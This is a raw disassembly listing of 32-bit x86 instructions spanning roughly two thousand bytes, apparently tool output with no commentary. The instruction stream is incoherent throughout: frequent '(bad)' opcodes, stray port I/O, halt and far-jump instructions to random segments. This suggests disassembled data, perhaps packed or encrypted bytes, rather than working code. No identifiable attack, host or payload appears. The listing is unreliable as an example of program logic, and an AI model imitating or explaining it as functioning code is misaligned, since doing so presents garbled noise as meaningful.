  405ef6:	xor    BYTE PTR [edi-0x5f62324a],ch
  405efc:	xchg   esi,eax
  405efd:	lods   al,BYTE PTR ds:[esi]
  405efe:	xor    esp,ebp
  405f00:	repnz push ss
  405f02:	sub    bh,0xe1
  405f05:	cmp    al,0x49
  405f07:	add    al,0x20
  405f09:	mov    esi,0xbf553337
  405f0e:	ret    0xaf29
  405f11:	call   0xd9c4:0xb29f1836
  405f18:	xchg   DWORD PTR [esi-0x5cb87b4e],esp
  405f1e:	scas   al,BYTE PTR es:[edi]
  405f1f:	pusha  
  405f20:	daa    
  405f21:	adc    DWORD PTR [ecx-0xbbde30a],ecx
  405f27:	mov    esi,0xbc1d5736
  405f2c:	mov    WORD PTR [esi],gs
  405f2e:	xchg   ebx,eax
  405f2f:	xor    eax,0xd7b3bfb1
  405f34:	mov    dh,0xc2
  405f36:	call   0xa6c5b50b
  405f3b:	das    
  405f3c:	lods   eax,DWORD PTR ds:[esi]
  405f3d:	or     edx,edx
  405f3f:	or     bh,BYTE PTR [ebx+0x6e]
  405f42:	loop   0x405f85
  405f44:	mov    ah,0x5a
  405f46:	push   ecx
  405f47:	jb     0x405fa0
  405f49:	scas   eax,DWORD PTR es:[edi]
  405f4a:	shl    bl,1
  405f4c:	mov    ds:0x51446f6b,eax
  405f51:	pop    edi
  405f52:	dec    esi
  405f53:	mov    edi,?
  405f55:	push   eax
  405f56:	sar    dh,cl
  405f58:	or     BYTE PTR [ebx-0x19],dl
  405f5b:	lods   al,BYTE PTR ds:[esi]
  405f5c:	js     0x405f52
  405f5e:	jmp    0x5a6e273c
  405f63:	mov    esp,DWORD PTR [ecx-0x2]
  405f66:	sahf   
  405f67:	pop    eax
  405f68:	cmp    ebx,ebx
  405f6a:	mov    eax,0xbd5b6fec
  405f6f:	xor    dl,BYTE PTR [ecx-0x12]
  405f72:	dec    ebp
  405f73:	bound  edx,QWORD PTR [esi-0x25f51438]
  405f79:	lea    ebx,[edi+0x63f15633]
  405f7f:	(bad)  
  405f81:	shl    DWORD PTR [edi+0x45],0xb
  405f85:	test   eax,0xe9614457
  405f8a:	and    edx,DWORD PTR [eax-0x22]
  405f8d:	adc    ecx,DWORD PTR [edx+eiz*1-0x2a]
  405f91:	rcr    BYTE PTR [esi+0x40fe3994],cl
  405f97:	xor    al,0x5c
  405f99:	test   al,0xaf
  405f9b:	pop    esp
  405f9c:	and    eax,0x89710386
  405fa1:	ss push esp
  405fa3:	sar    BYTE PTR [ebx],1
  405fa5:	push   cs
  405fa6:	adc    DWORD PTR [esi],edx
  405fa8:	fidivr WORD PTR [esi-0x34]
  405fab:	sbb    DWORD PTR [edx-0x74],eax
  405fae:	cmp    al,0x78
  405fb0:	dec    eax
  405fb1:	ficomp WORD PTR [ebx]
  405fb3:	pushf  
  405fb4:	fmul   DWORD PTR [esi+0x4a6c9fbe]
  405fba:	loop   0x405fb4
  405fbc:	and    DWORD PTR [edi-0x4e],esi
  405fbf:	not    BYTE PTR [eax-0x38]
  405fc2:	inc    dx
  405fc4:	int    0x1
  405fc6:	loopne 0x405f82
  405fc8:	call   0xe842127a
  405fcd:	sub    ecx,DWORD PTR [edi+0x31]
  405fd0:	test   eax,0xf9ab23cf
  405fd5:	pop    ebx
  405fd6:	xchg   edx,eax
  405fd7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405fd8:	loop   0x406013
  405fda:	or     bl,BYTE PTR [ebx]
  405fdc:	shr    BYTE PTR [ebx+ebp*4+0x23b2c9cf],cl
  405fe3:	push   edx
  405fe4:	(bad)  
  405fe5:	lock dec ebx
  405fe7:	ret    
  405fe8:	push   ebp
  405fe9:	lahf   
  405fea:	or     al,0xa1
  405fec:	(bad)  
  405fed:	outs   dx,BYTE PTR ds:[esi]
  405fee:	mov    al,0xb6
  405ff0:	ret    0x1b47
  405ff3:	sbb    BYTE PTR [esi+0x2ef44052],dl
  405ff9:	(bad)  
  405ffa:	retf   
  405ffb:	push   esi
  405ffc:	and    BYTE PTR [esi-0x49eb023d],bh
  406002:	hlt    
  406003:	adc    esp,ebp
  406005:	adc    cl,BYTE PTR [esi]
  406007:	(bad)  
  406008:	jae    0x405ffa
  40600a:	fsub   DWORD PTR [ebp+0x6921726f]
  406010:	fld    TBYTE PTR [ebx]
  406012:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406014:	cmp    ebp,esi
  406016:	in     eax,dx
  406017:	nop
  406018:	aaa    
  406019:	cmp    al,0x8c
  40601b:	xor    eax,0xe8230912
  406020:	sub    ah,0xf8
  406023:	sar    DWORD PTR [ebx],1
  406025:	arpl   si,dx
  406027:	mov    ds:0xbf774f7a,eax
  40602c:	dec    ebp
  40602d:	lahf   
  40602e:	mov    ch,0x6e
  406030:	mov    ecx,0xa37a1603
  406035:	pop    esp
  406036:	shl    DWORD PTR [edi],cl
  406038:	sbb    bl,BYTE PTR [esi-0x71e2589]
  40603e:	sbb    ch,BYTE PTR [ebx-0xf9f0f87]
  406044:	or     eax,0x513069b4
  406049:	arpl   WORD PTR [ebx+ecx*1-0x4b],ax
  40604d:	jmp    0x993c:0x1852b6da
  406054:	sub    bh,BYTE PTR [eax*2+0x78e6acdf]
  40605b:	and    DWORD PTR [ebp-0x3bb4c694],edx
  406061:	loopne 0x40607e
  406063:	cmp    BYTE PTR [edx+0x4d],dh
  406066:	stos   BYTE PTR es:[edi],al
  406067:	mov    ch,0x14
  406069:	mov    dl,0xcb
  40606b:	jge    0x4060cd
  40606d:	inc    edi
  40606e:	ret    
  40606f:	dec    esi
  406070:	push   es
  406071:	jae    0x40606d
  406073:	stos   DWORD PTR es:[edi],eax
  406074:	scas   al,BYTE PTR es:[edi]
  406075:	cdq    
  406076:	mov    dl,0x30
  406078:	xchg   ebx,eax
  406079:	mov    ebp,0x20292e7b
  40607e:	sbb    eax,DWORD PTR [esi+0x7ea26a35]
  406084:	or     dl,dh
  406086:	jl     0x406104
  406088:	xchg   DWORD PTR [ecx],edi
  40608a:	aam    0x55
  40608c:	ins    BYTE PTR es:[edi],dx
  40608d:	xchg   esi,eax
  40608e:	or     DWORD PTR [ecx],esi
  406090:	sub    eax,0xbdc50cce
  406095:	mov    ah,BYTE PTR [ecx+ebx*1-0x1250a14b]
  40609c:	mov    edx,0xaf802a1f
  4060a1:	mov    eax,ds:0x16dcb709
  4060a6:	clc    
  4060a7:	adc    cl,BYTE PTR [edx+0x4f6a09f2]
  4060ad:	inc    eax
  4060ae:	dec    edi
  4060af:	test   al,0x10
  4060b1:	push   edi
  4060b2:	push   esp
  4060b3:	mov    ecx,0x2b57435e
  4060b8:	sbb    eax,0x49183cf0
  4060bd:	jp     0x4060ab
  4060bf:	fild   WORD PTR [ebx+0x6d]
  4060c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4060c3:	sub    al,0xcb
  4060c5:	pop    es
  4060c6:	jp     0x40604e
  4060c8:	mov    bh,0x60
  4060ca:	mov    BYTE PTR [eax+ebp*4+0x4e],0xbc
  4060cf:	stos   DWORD PTR es:[edi],eax
  4060d0:	jle    0x406119
  4060d2:	iret   
  4060d3:	aad    0x9
  4060d5:	ins    DWORD PTR es:[edi],dx
  4060d6:	mov    bl,0xc8
  4060d8:	ja     0x406123
  4060da:	lock les edi,FWORD PTR [ebx]
  4060dd:	popa   
  4060de:	mov    bh,0x24
  4060e0:	push   0xffffff84
  4060e2:	mov    edi,0xf594f5ed
  4060e7:	xor    eax,0xb23a2aa5
  4060ec:	call   0x1700:0xeb28346e
  4060f3:	aas    
  4060f4:	(bad)  
  4060f6:	test   DWORD PTR [ecx+0x2d],edx
  4060f9:	jp     0x40610b
  4060fb:	mov    esp,DWORD PTR [ecx-0x305ea293]
  406101:	ds pop esp
  406103:	scas   al,BYTE PTR es:[edi]
  406104:	lea    edx,[eax]
  406106:	xor    al,0xed
  406108:	mov    bl,0x56
  40610a:	int    0xb
  40610c:	jge    0x406151
  40610e:	add    DWORD PTR [ecx],esp
  406110:	fistp  DWORD PTR [ebp+0x6d]
  406113:	mov    al,0x24
  406115:	loope  0x4060cf
  406117:	dec    ebx
  406118:	enter  0x13d3,0xa3
  40611c:	sbb    dh,bh
  40611e:	mov    ecx,0x69c7f0d7
  406123:	mov    cl,0xe2
  406125:	sub    al,0x58
  406127:	cs dec esi
  406129:	xor    edx,DWORD PTR es:[edx+edi*8]
  40612d:	xor    bl,BYTE PTR ds:0x8f009366
  406133:	rol    DWORD PTR [eax+0x778bfce1],1
  406139:	adc    BYTE PTR [eax-0x5795861],bl
  40613f:	dec    edx
  406140:	sbb    BYTE PTR ds:[esi+0x7141ce74],cl
  406147:	push   eax
  406148:	mov    edi,0xb1650bd7
  40614d:	cmp    ah,BYTE PTR [ecx]
  40614f:	hlt    
  406150:	ret    0x2309
  406153:	add    BYTE PTR [edi+0xfeb2e8b],dl
  406159:	pop    ebx
  40615a:	enter  0x5ddf,0x5c
  40615e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40615f:	add    edi,DWORD PTR [ebx]
  406161:	sbb    BYTE PTR [edi],dh
  406163:	cld    
  406164:	rcl    bl,0x89
  406167:	or     eax,ecx
  406169:	das    
  40616a:	dec    esp
  40616b:	pop    ebx
  40616c:	mov    eax,DWORD PTR [ebp+0x1e]
  40616f:	push   eax
  406170:	mov    dh,0x1e
  406172:	mov    ds:0xe35ce8a4,al
  406177:	mov    ch,0xcf
  406179:	jmp    0x8c0b:0x5d4edeb2
  406180:	fild   QWORD PTR [edi+0x17]
  406183:	jge    0x406131
  406185:	push   ebp
  406186:	push   cs
  406187:	and    al,0x66
  406189:	cmp    BYTE PTR [ecx+0x6c],dh
  40618c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40618d:	cmp    BYTE PTR [ecx-0x46],cl
  406190:	jg     0x406165
  406192:	loop   0x40617a
  406194:	mov    WORD PTR [ebp+0xd08b557],?
  40619a:	inc    edi
  40619b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40619c:	bound  ebx,QWORD PTR [eax]
  40619e:	jg     0x4061a2
  4061a0:	sbb    al,0x68
  4061a2:	cmp    DWORD PTR [edx-0x3],0x7ccc24cd
  4061a9:	pop    esi
  4061aa:	sbb    BYTE PTR [esi+0x36],bl
  4061ad:	mov    edi,0x466145fb
  4061b2:	dec    ebp
  4061b3:	lock ds xchg edx,eax
  4061b6:	aas    
  4061b7:	push   cs
  4061b8:	scas   eax,DWORD PTR es:[edi]
  4061b9:	dec    ebx
  4061ba:	pop    ebp
  4061bb:	push   cs
  4061bc:	xlat   BYTE PTR ds:[ebx]
  4061bd:	xor    BYTE PTR [edi],bl
  4061bf:	in     eax,dx
  4061c0:	(bad)  
  4061c2:	(bad)  
  4061c3:	ror    BYTE PTR [eax],1
  4061c5:	xor    ah,cl
  4061c7:	js     0x4061f8
  4061c9:	xchg   BYTE PTR [edi+0x2e71aef4],dl
  4061cf:	pop    eax
  4061d0:	mov    esi,fs
  4061d2:	imul   ebp,esp,0x3d
  4061d5:	pusha  
  4061d6:	cmp    eax,0xb424d6b1
  4061db:	xor    DWORD PTR [esi-0x43cdd289],ebx
  4061e1:	or     ebx,ebp
  4061e3:	outs   dx,BYTE PTR ds:[esi]
  4061e4:	rcl    DWORD PTR [edx+eax*2-0x35],0xd6
  4061e9:	cmp    edi,edi
  4061eb:	xchg   esp,eax
  4061ec:	(bad)  
  4061ed:	mov    esp,0x38c4a9da
  4061f2:	mov    ds:0x541aca80,eax
  4061f7:	popa   
  4061f8:	or     DWORD PTR [edi+0x4bccbe11],eax
  4061fe:	lea    esp,[si+0x2f]
  406202:	cmp    esp,eax
  406204:	xor    al,0xa
  406206:	imul   edi,DWORD PTR [eax+0x3732dbf0],0xbc922e62
  406210:	pusha  
  406211:	mov    dh,0x1c
  406213:	jno    0x406266
  406215:	or     edx,0x68
  406218:	out    dx,eax
  406219:	sti    
  40621a:	add    BYTE PTR [esi+ebx*8-0x2bed7138],0xda
  406222:	out    dx,eax
  406223:	adc    DWORD PTR [esi-0x3eea7b31],ebx
  406229:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40622a:	xchg   esi,eax
  40622b:	jo     0x406242
  40622d:	jns    0x406286
  40622f:	repnz xor DWORD PTR [eax+eax*1-0x435ef64c],esp
  406237:	dec    esi
  406238:	scas   eax,DWORD PTR es:[edi]
  406239:	pusha  
  40623a:	jmp    FWORD PTR [esi+0x2eada84b]
  406240:	sbb    al,0xeb
  406242:	adc    edi,DWORD PTR [ecx+0x1fb68f23]
  406248:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  40624a:	jl     0x40629c
  40624c:	cmp    edi,DWORD PTR [ebp+0x33f9e882]
  406252:	mov    edx,0x504f1bc8
  406257:	call   0xf9cbead1
  40625c:	cmp    al,0x29
  40625e:	in     eax,0x21
  406260:	jns    0x4062a8
  406262:	adc    esp,edi
  406264:	mov    ebx,0x9745faa7
  406269:	fld    QWORD PTR [ebx-0x2a66e3cc]
  40626f:	dec    BYTE PTR [eax-0x19ac31d7]
  406275:	jle    0x4062b6
  406277:	jo     0x4061f9
  406279:	dec    edi
  40627a:	pushf  
  40627b:	adc    esp,0x4ee5f03e
  406281:	push   ss
  406282:	mov    al,ds:0xb2fbf930
  406287:	xchg   edx,eax
  406288:	xor    DWORD PTR [edi-0x17],eax
  40628b:	stos   BYTE PTR es:[edi],al
  40628c:	push   ebp
  40628d:	mov    cl,0x91
  40628f:	add    eax,DWORD PTR [ebx+0x31]
  406292:	cdq    
  406293:	loop   0x406255
  406295:	jmp    0x3c05:0x7f7429da
  40629c:	daa    
  40629d:	mov    edi,0x1c528483
  4062a2:	ss jmp 0x2ebc:0x5c1bc331
  4062aa:	pushf  
  4062ab:	outs   dx,DWORD PTR ds:[esi]
  4062ac:	cwde   
  4062ad:	shl    DWORD PTR [edx+0x526d0e9e],cl
  4062b3:	mov    dh,0x56
  4062b5:	test   BYTE PTR [ecx+ebx*8+0xfc1fd37],ah
  4062bc:	bnd jne 0x40624f
  4062bf:	ins    DWORD PTR es:[edi],dx
  4062c0:	dec    ebx
  4062c1:	xlat   BYTE PTR ds:[ebx]
  4062c2:	fld    QWORD PTR [edi+ecx*2-0x3187d53f]
  4062c9:	add    eax,0x4bd7f98f
  4062ce:	push   ebp
  4062cf:	mov    bh,0xb4
  4062d1:	dec    esp
  4062d2:	or     al,0x5d
  4062d4:	sbb    eax,0xfa604eac
  4062d9:	sub    eax,DWORD PTR [eax-0x3b0a0aec]
  4062df:	inc    esi
  4062e0:	daa    
  4062e1:	push   0xa8bec418
  4062e6:	out    0x75,al
  4062e8:	call   0xa70c17b4
  4062ed:	repnz shl DWORD PTR [ebp-0xb],1
  4062f1:	retf   
  4062f2:	mov    al,0x7c
  4062f4:	lods   eax,DWORD PTR ds:[esi]
  4062f5:	idiv   DWORD PTR [esi-0xf]
  4062f8:	test   BYTE PTR [edx+0x76],bh
  4062fb:	shl    DWORD PTR [esi-0x5b],1
  4062fe:	lea    edx,[ebp-0x27]
  406301:	dec    ecx
  406302:	sub    eax,0x7a68270
  406307:	and    eax,0xe9c3ea90
  40630c:	loope  0x4062b0
  40630e:	add    DWORD PTR [eax-0x7],eax
  406311:	fs jl  0x4062cd
  406314:	inc    ebx
  406315:	rol    ebp,cl
  406317:	jecxz  0x406361
  406319:	mov    cl,BYTE PTR [esi]
  40631b:	or     ch,cl
  40631d:	icebp  
  40631e:	inc    ebx
  40631f:	int3   
  406320:	sub    al,0xb7
  406322:	lea    ebp,[edx+0x6eb353d0]
  406328:	sbb    DWORD PTR [ebp-0x42],edx
  40632b:	mov    ebp,DWORD PTR [edx-0x4eeb0411]
  406331:	adc    esi,ebp
  406333:	xor    eax,0xb7c2eeb8
  406338:	aaa    
  406339:	std    
  40633a:	lods   eax,DWORD PTR ds:[esi]
  40633b:	dec    edi
  40633c:	or     BYTE PTR [edi],bl
  40633e:	cmp    DWORD PTR [eax],ebx
  406340:	cmp    al,0x30
  406342:	daa    
  406343:	sbb    bl,bh
  406345:	fild   DWORD PTR [ebp+ebp*4-0x35]
  406349:	inc    esp
  40634a:	lods   eax,DWORD PTR ds:[esi]
  40634b:	cmp    BYTE PTR [edx],dl
  40634d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40634e:	loope  0x40630b
  406350:	rcl    BYTE PTR [esp+ebp*1-0x5],1
  406354:	pop    eax
  406355:	fisub  WORD PTR [edx]
  406357:	imul   edx,DWORD PTR [esi],0xffffff88
  40635a:	cmp    BYTE PTR [edi-0x5755b7ba],ch
  406360:	pop    es
  406361:	pusha  
  406362:	cmp    DWORD PTR [ebx+ebp*8+0x645c355f],eax
  406369:	xchg   edi,eax
  40636a:	dec    ebp
  40636b:	inc    edx
  40636c:	push   ss
  40636d:	jnp    0x406311
  40636f:	pop    es
  406370:	int    0x37
  406372:	or     BYTE PTR [ebx],bl
  406374:	mov    dl,0x73
  406376:	das    
  406377:	mov    cl,0xd2
  406379:	push   eax
  40637a:	mov    cl,0x6f
  40637c:	jg     0x4063d8
  40637e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40637f:	push   es
  406380:	mov    WORD PTR [ecx],gs
  406382:	mov    dh,0xbd
  406384:	scas   al,BYTE PTR es:[edi]
  406385:	xchg   esi,esi
  406387:	xor    DWORD PTR [ecx-0x7d7f8249],0xffffff8c
  40638e:	rol    DWORD PTR [edi+0x46],cl
  406391:	into   
  406392:	js     0x4063a9
  406394:	(bad)  
  406395:	dec    edx
  406396:	and    bh,BYTE PTR [ecx+0x4d2c63ab]
  40639c:	(bad)  
  40639d:	jo     0x4063d6
  40639f:	dec    edi
  4063a0:	dec    edx
  4063a1:	popa   
  4063a2:	lea    eax,[eax+0x3b]
  4063a5:	jbe    0x4063ac
  4063a7:	pop    edx
  4063a8:	fcom   QWORD PTR [edx+0x13]
  4063ab:	jae    0x40633d
  4063ad:	fst    QWORD PTR [ecx-0x5d]
  4063b0:	and    ebp,esp
  4063b2:	and    edi,esp
  4063b4:	lods   al,BYTE PTR ds:[esi]
  4063b5:	jns    0x406358
  4063b7:	js     0x4063d8
  4063b9:	and    al,0xa4
  4063bb:	loopne 0x40638e
  4063bd:	sub    al,0xc8
  4063bf:	jl     0x406353
  4063c1:	mov    ch,0x5c
  4063c3:	and    eax,DWORD PTR [edx+0x2]
  4063c6:	mov    ch,dh
  4063c8:	add    al,0x3f
  4063ca:	xchg   esp,eax
  4063cb:	xor    BYTE PTR [ecx+0x6],bh
  4063ce:	jp     0x4063a4
  4063d0:	add    edi,ecx
  4063d2:	xchg   esi,eax
  4063d3:	clc    
  4063d4:	aas    
  4063d5:	shr    DWORD PTR [ebx-0x1ef6b099],0x9
  4063dc:	pusha  
  4063dd:	xor    BYTE PTR [edx+0x1d54d4f6],al
  4063e3:	scas   al,BYTE PTR es:[edi]
  4063e4:	mov    edx,0xb94571e4
  4063e9:	mov    bl,0x86
  4063eb:	icebp  
  4063ec:	stos   DWORD PTR es:[edi],eax
  4063ed:	ror    DWORD PTR [ecx],0x51
  4063f0:	dec    ebx
  4063f1:	pop    ebp
  4063f2:	sbb    esi,DWORD PTR [ebp-0x7a]
  4063f5:	ror    DWORD PTR [edx],1
  4063f7:	adc    dl,ah
  4063f9:	call   0x62fc4492
  4063fe:	call   0x6e49438f
  406403:	mov    ds:0xe455e00a,eax
  406408:	push   ecx
  406409:	int3   
  40640a:	sub    BYTE PTR [ebx+0x5d4f9f9d],0x8f
  406411:	add    DWORD PTR ds:0xce240fd2,ebp
  406417:	icebp  
  406418:	imul   edx,DWORD PTR [esi-0x276d9dc5],0x68
  40641f:	xchg   ecx,eax
  406420:	jbe    0x406460
  406422:	(bad)  
  406423:	pop    ebp
  406424:	popa   
  406425:	sub    al,0x5d
  406427:	rol    ah,cl
  406429:	jmp    0x4063f9
  40642b:	in     al,dx
  40642c:	cmp    BYTE PTR [edi+0x13],dh
  40642f:	jnp    0x406451
  406431:	mov    edi,0x9de4976
  406436:	div    DWORD PTR [ecx]
  406438:	mov    al,0x11
  40643a:	std    
  40643b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40643c:	iret   
  40643d:	jmp    0x4992:0x7e141163
  406444:	add    bl,BYTE PTR [eax+0x31]
  406447:	dec    esp
  406448:	push   edi
  406449:	dec    esi
  40644a:	dec    esp
  40644b:	cli    
  40644c:	in     eax,dx
  40644d:	cdq    
  40644e:	mov    ebx,0xfebf9157
  406453:	mov    eax,ds:0x8d614f87
  406458:	or     al,0x0
  40645a:	and    BYTE PTR [edi],ah
  40645c:	addr16 fs push eax
  40645f:	xor    eax,0xf969e4ec
  406464:	scas   al,BYTE PTR es:[edi]
  406465:	push   esi
  406466:	push   eax
  406467:	jl     0x4064ad
  406469:	jne    0x4064d2
  40646b:	mov    esi,0x24256b63
  406470:	add    al,0x95
  406472:	push   ebp
  406473:	lea    esi,[ecx]
  406475:	or     al,0xce
  406477:	jp     0x4063fb
  406479:	pop    ss
  40647a:	int    0x7f
  40647c:	or     DWORD PTR [ebx],edi
  40647e:	pop    ds
  40647f:	ror    DWORD PTR [ecx-0x48],cl
  406482:	retf   0x3710
  406485:	xor    eax,0xd4eb4f9
  40648a:	pop    ecx
  40648b:	stos   DWORD PTR es:[edi],eax
  40648c:	dec    ebx
  40648d:	je     0x406503
  40648f:	int    0xc4
  406491:	enter  0x8cd2,0x81
  406495:	test   DWORD PTR [esi+0x1d],edx
  406498:	shl    ebx,0xb8
  40649b:	jge    0x406473
  40649d:	dec    edi
  40649e:	lods   eax,DWORD PTR ds:[esi]
  40649f:	sub    esp,DWORD PTR [esi-0x59b5f405]
  4064a5:	adc    BYTE PTR [esp+eiz*8],dh
  4064a8:	dec    ecx
  4064a9:	nop
  4064aa:	rcl    BYTE PTR [ebx-0x2176794],1
  4064b0:	push   eax
  4064b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4064b2:	mov    bh,0x85
  4064b4:	add    eax,0x640abe33
  4064b9:	inc    ebx
  4064ba:	and    al,0x6f
  4064bc:	xchg   bl,ah
  4064be:	(bad)
  4064c1:	xor    dh,BYTE PTR [ebx]
  4064c3:	cmp    BYTE PTR [esi+0x7aff1529],cl
  4064c9:	inc    edx
  4064ca:	inc    edi
  4064cb:	jecxz  0x4064af
  4064cd:	mov    cs,WORD PTR [ecx+0x14]
  4064d0:	cmp    al,0xae
  4064d2:	push   esp
  4064d3:	fistp  WORD PTR [ebx]
  4064d5:	aad    0x19
  4064d7:	mov    ds:0x8c0d618,eax
  4064dc:	or     dh,bl
  4064de:	adc    al,0x10
  4064e0:	cwde   
  4064e1:	mov    al,ds:0x76a6e335
  4064e6:	cmp    ch,cl
  4064e8:	ss jae 0x4064c9
  4064eb:	add    al,0x24
  4064ed:	jbe    0x4064fc
  4064ef:	imul   esi,eax,0x359e88e7
  4064f5:	cmp    al,0x6c
  4064f7:	or     edi,ebx
  4064f9:	adc    eax,0x63558c0b
  4064fe:	sub    eax,0x5314f6c2
  406503:	jp     0x40651a
  406505:	mov    ds:0x3acb1860,eax
  40650a:	pop    edx
  40650b:	and    DWORD PTR [ebx],eax
  40650d:	inc    ebx
  40650e:	repnz ins BYTE PTR es:[edi],dx
  406510:	jmp    0x711c:0x5c75949
  406517:	inc    ebx
  406518:	pop    edi
  406519:	hlt    
  40651a:	sub    BYTE PTR [edi+0x7a],bl
  40651d:	dec    ebx
  40651e:	mov    cl,0xe0
  406520:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406521:	mov    edx,0x80f9c74f
  406526:	out    dx,eax
  406527:	cld    
  406528:	stos   BYTE PTR es:[edi],al
  406529:	adc    esi,DWORD PTR [ecx+0x5]
  40652c:	dec    ebx
  40652d:	in     eax,0xea
  40652f:	pusha  
  406530:	or     al,0xf8
  406532:	mov    bh,bl
  406534:	jg     0x40657b
  406536:	mov    ebp,DWORD PTR [eax+0x8]
  406539:	dec    ecx
  40653a:	fnsave [esi+0x63]
  40653d:	and    al,0x30
  40653f:	ins    BYTE PTR es:[edi],dx
  406540:	adc    eax,0x869a9daf
  406545:	cwde   
  406546:	mov    al,ds:0x69a0a8e3
  40654b:	(bad)  
  40654c:	cmp    ch,BYTE PTR [ebp-0x27]
  40654f:	retf   
  406550:	test   eax,0xfa68b4da
  406555:	enter  0x92e8,0x48
  406559:	cmc    
  40655a:	mov    ds:0x9eed6612,al
  40655f:	cmp    eax,DWORD PTR [ecx]
  406561:	test   al,0xf1
  406563:	dec    esi
  406564:	jle    0x406554
  406566:	adc    DWORD PTR ss:[ebx-0x55],ecx
  40656a:	out    dx,al
  40656b:	cli    
  40656c:	push   eax
  40656d:	add    al,BYTE PTR [esi-0x4ea7cb4c]
  406573:	js     0x40657f
  406575:	lea    edx,[edx+ebx*2-0x11277d83]
  40657c:	push   ds
  40657d:	out    0x1f,al
  40657f:	jnp    0x406518
  406581:	mov    dl,0x26
  406583:	jg     0x4065f9
  406585:	jge    0x406510
  406587:	fistp  DWORD PTR [esi+0x21a08af4]
  40658d:	jl     0x40654f
  40658f:	mov    bl,0x5b
  406591:	xchg   ecx,eax
  406592:	out    dx,al
  406593:	imul   ebx,DWORD PTR [ebp+0x12fd5ca4],0x0
  40659a:	xor    ah,BYTE PTR [ecx+0x11]
  40659d:	cmp    eax,0x82500933
  4065a2:	enter  0xc0df,0x43
  4065a6:	xchg   ebp,eax
  4065a7:	xchg   edi,eax
  4065a8:	mov    ecx,ebx
  4065aa:	inc    ebp
  4065ab:	push   esp
  4065ac:	xchg   ecx,eax
  4065ad:	add    dl,0x37
  4065b0:	pop    edx
  4065b1:	pop    esp
  4065b2:	gs inc ebp
  4065b4:	mov    dh,0x3c
  4065b6:	ja     0x4065bd
  4065b8:	(bad)  
  4065b9:	sub    DWORD PTR [eax],eax
  4065bb:	mov    eax,0xf88f271
  4065c0:	jns    0x40657f
  4065c2:	popa   
  4065c3:	jno    0x40663b
  4065c5:	aas    
  4065c6:	mov    ebx,0x8cd8a6db
  4065cb:	push   ebp
  4065cc:	and    al,0x24
  4065ce:	imul   ecx,DWORD PTR [edi+0x67],0xbb7700a3
  4065d5:	or     al,0x4b
  4065d7:	int    0xe9
  4065d9:	cli    
  4065da:	xor    eax,0x4284e47
  4065df:	push   eax
  4065e0:	mov    dh,0x9f
  4065e2:	adc    dh,BYTE PTR [eax+ebp*1]
  4065e5:	mov    WORD PTR [edi+eiz*8+0x22],?
  4065e9:	jge    0x4065c7
  4065eb:	push   ecx
  4065ec:	and    ch,cl
  4065ee:	adc    dh,ch
  4065f0:	pop    ebx
  4065f1:	mov    cl,0xb4
  4065f3:	mov    bl,0x4e
  4065f5:	or     eax,0x83748fb2
  4065fa:	pop    esp
  4065fb:	jl     0x406638
  4065fd:	xor    al,0x1f
  4065ff:	(bad)  
  406600:	push   esp
  406601:	inc    ecx
  406602:	popa   
  406603:	adc    al,BYTE PTR [ebx+0x2a]
  406606:	or     esp,DWORD PTR [edx+0x52]
  406609:	xchg   esi,eax
  40660a:	or     BYTE PTR [ebp-0x734eab9d],dl
  406610:	or     ebx,edi
  406612:	in     eax,0xef
  406614:	dec    ecx
  406615:	lds    esp,FWORD PTR [edi+0x3404ba77]
  40661b:	call   0x65bc1ba0
  406620:	hlt    
  406621:	and    DWORD PTR [ebp+0x53],edx
  406624:	push   eax
  406625:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406626:	push   eax
  406627:	or     DWORD PTR ss:[edi],ecx
  40662a:	test   al,0x14
  40662c:	dec    al
  40662e:	leave  
  40662f:	sub    cl,ah
  406631:	int3   
  406632:	test   DWORD PTR [edi-0x75df8d07],edx
  406638:	gs loop 0x406642
  40663b:	daa    
  40663c:	in     eax,0x9e
  40663e:	push   ecx
  40663f:	mov    ebx,0x4920cda6
  406644:	int3   
  406645:	sub    ebx,0x79
  406648:	jno    0x406617
  40664a:	dec    ecx
  40664b:	xor    ecx,edi
  40664d:	hlt    
  40664e:	or     edx,esp
  406650:	pop    edi
  406651:	std    
  406652:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406653:	test   al,0xf9
  406655:	add    BYTE PTR [edi-0x2a],dl
  406658:	jg     0x4066b4
  40665a:	push   0xffffffad
  40665c:	in     al,0xa2
  40665e:	jmp    0xae42:0xc7e1766b
  406665:	in     al,0x26
  406667:	jae    0x4066bc
  406669:	clc    
  40666a:	add    dl,BYTE PTR [ecx]
  40666c:	es pop edx
  40666e:	fisub  WORD PTR [esi-0x41]
  406671:	mov    esp,0x91383a7c
  406676:	out    0xbb,al
  406678:	xchg   ebp,eax
  406679:	jmp    0xbdaa401e
  40667e:	fst    DWORD PTR [eax]
  406680:	scas   eax,DWORD PTR es:[edi]
  406681:	xchg   ebp,eax
  406682:	add    eax,0x8e2531d8
  406687:	fnsave [ebx+0x4f]
  40668a:	mov    DWORD PTR [esi-0x7d],esi
  40668d:	mov    al,0x38
  40668f:	fisttp WORD PTR [edx]
  406691:	(bad)  
  406692:	xor    al,0x8e
  406694:	jns    0x406679
  406696:	(bad)  
  406697:	lods   eax,DWORD PTR ds:[esi]
  406698:	cld    
  406699:	shr    ebp,1
  40669b:	ret    0x9a89
  40669e:	sub    DWORD PTR [ebp+0x53b11b25],eax
  4066a4:	and    esp,DWORD PTR [ecx+0x44359d92]
  4066aa:	pop    esi
  4066ab:	or     al,BYTE PTR [esi+0x54]
  4066ae:	sbb    DWORD PTR [eax+0x2014e4e7],esi
  4066b4:	mov    edx,DWORD PTR [edi+0x597febc7]
  4066ba:	test   al,0xf1
  4066bc:	jmp    0x406649
  4066be:	shr    BYTE PTR [edx],0xd
  4066c1:	inc    esp
